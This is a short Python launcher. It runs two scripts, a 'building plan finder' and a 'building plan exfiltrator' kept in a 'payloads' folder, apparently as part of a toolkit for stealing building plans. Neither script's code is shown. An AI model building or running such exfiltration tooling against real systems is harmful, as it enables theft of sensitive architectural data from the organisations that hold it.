import subprocess
import os

def main():
    # Run the building plan finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "building_plan_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the building plan exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "building_plan_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
